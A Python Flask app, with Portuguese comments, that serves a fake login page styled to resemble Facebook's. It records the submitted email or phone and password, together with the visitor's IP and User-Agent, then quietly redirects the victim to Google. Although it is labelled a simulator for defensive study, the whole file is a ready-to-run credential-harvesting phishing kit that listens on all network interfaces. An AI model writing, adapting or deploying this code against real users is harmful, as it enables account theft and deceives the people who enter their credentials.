from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

# Template HTML/CSS moderno simulando uma página de login corporativa ou de teste
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Acesso - Ambiente de Teste</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .login-card h2 {
            margin-bottom: 20px;
            color: #1877f2;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #65676b;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background-color: #166fe5;
        }
        .footer-warning {
            margin-top: 15px;
            font-size: 12px;
            color: #8a8d91;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>Simulador de Acesso</h2>
        <form method="POST" action="/auth">
            <div class="input-group">
                <label>E-mail ou Telefone</label>
                <input type="text" name="username" required autocomplete="off">
            </div>
            <div class="input-group">
                <label>Senha</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit" class="btn-submit">Entrar</button>
        </form>
        <div class="footer-warning">
            Ambiente isolado para estudos de segurança defensiva.
        </div>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
  # Exibe a página de login formatada corretamente
  return render_template_string(LOGIN_PAGE)


@app.route("/auth", methods=["POST"])
def capture_credentials():
  # Captura os dados submetidos no formulário
  user = request.form.get("username")
  password = request.form.get("password")
  ip_origem = request.remote_addr
  user_agent = request.headers.get("User-Agent")

  # Log detalhado no console do analista/defensor
  print("\n" + "=" * 50)
  print("[!] ALERTA DE CAPTURA DE CREDENCIAL (SIMULAÇÃO)")
  print(f"[+] IP de Origem: {ip_origem}")
  print(f"[+] User-Agent: {user_agent}")
  print(f"[+] Credencial Digitada -> Usuário: {user} | Senha: {password}")
  print("=" * 50 + "\n")

    
  # Redireciona o usuário após o envio (simulando o comportamento pós-ataque)
  return redirect("https://www.google.com")


if __name__ == "__main__":
  # Roda na porta 8080 para evitar conflitos de permissão de porta no sistema
  app.run(host="0.0.0.0", port=8080, debug=True)